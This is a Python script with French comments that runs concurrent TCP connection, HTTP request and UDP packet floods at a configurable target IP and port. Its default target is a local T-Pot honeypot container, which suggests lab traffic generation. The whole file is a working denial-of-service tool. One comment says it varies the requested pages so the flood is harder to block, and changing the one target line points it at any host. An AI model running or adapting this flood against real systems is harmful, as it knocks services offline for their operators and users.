import asyncio
import random
import aiohttp
import socket

# ----- CONFIG -----
TARGET_IP = "127.0.0.1"     # IP du conteneur tpot
SSH_PORT = 22
HTTP_PORT = 9200
UDP_PORT = 22

NUM_CONNECTIONS = 200000    # nombre total de connexions par type
CONCURRENCY = 200           # connexions simultanées max
DELAY = 0.1                 # délai entre requêtes

# ----- TCP Flood -----
async def tcp_conn(i, sem):
    async with sem:
        try:
            reader, writer = await asyncio.open_connection(TARGET_IP, SSH_PORT)
            writer.close()
            await writer.wait_closed()
            print(f"[TCP] Connexion réussie ({i+1}/{NUM_CONNECTIONS})")
        except Exception as e:
            print(f"[TCP] Connexion échouée ({i+1}/{NUM_CONNECTIONS}): {e}")
        await asyncio.sleep(DELAY)

async def tcp_flood():
    sem = asyncio.Semaphore(CONCURRENCY)
    tasks = [tcp_conn(i, sem) for i in range(NUM_CONNECTIONS)]
    await asyncio.gather(*tasks)
    print("[TCP] Flood terminé")

# ----- HTTP Flood -----
async def http_conn(i, sem, session, pages):
    async with sem:
        try:
            page = random.choice(pages)
            url = f"http://{TARGET_IP}:{HTTP_PORT}{page}"
            async with session.get(url, timeout=2) as r:
                print(f"[HTTP] Req {i+1}/{NUM_CONNECTIONS} {page} → {r.status}")
        except Exception as e:
            print(f"[HTTP] Req {i+1}/{NUM_CONNECTIONS} échouée: {e}")
        await asyncio.sleep(DELAY)

async def http_flood():
    sem = asyncio.Semaphore(CONCURRENCY)
    pages = ["/aled", "/accueil", "/contact", "/blog"] #permet de diversifié les pages attaqué et être bloqué plus difficilement
    async with aiohttp.ClientSession() as session:
        tasks = [http_conn(i, sem, session, pages) for i in range(NUM_CONNECTIONS)]
        await asyncio.gather(*tasks)
    print("[HTTP] Flood terminé")

# ----- UDP Flood -----
async def udp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for i in range(NUM_CONNECTIONS):
        try:
            sock.sendto(b"Test UDP packet", (TARGET_IP, UDP_PORT))
            print(f"[UDP] Paquet {i+1}/{NUM_CONNECTIONS} envoyé")
        except Exception as e:
            print(f"[UDP] Paquet {i+1}/{NUM_CONNECTIONS} échoué: {e}")
        await asyncio.sleep(DELAY)
    sock.close()
    print("[UDP] Flood terminé")

# ----- Main -----
async def main():
    global NUM_CONNECTIONS

    NUM_CONNECTIONS = int(input("nombre de connexion total ?"))
    while NUM_CONNECTIONS < 0:
        print("saisir un nombre valide supérieur a 0")
        NUM_CONNECTIONS = int(input("nombre de connexion total ?"))
    print("Démarrage des attaques ...")
    await asyncio.gather(
        tcp_flood(),
        http_flood(),
        udp_flood()
    )
    print("Toutes les attaques sont terminées.")

if __name__ == "__main__":
    asyncio.run(main())
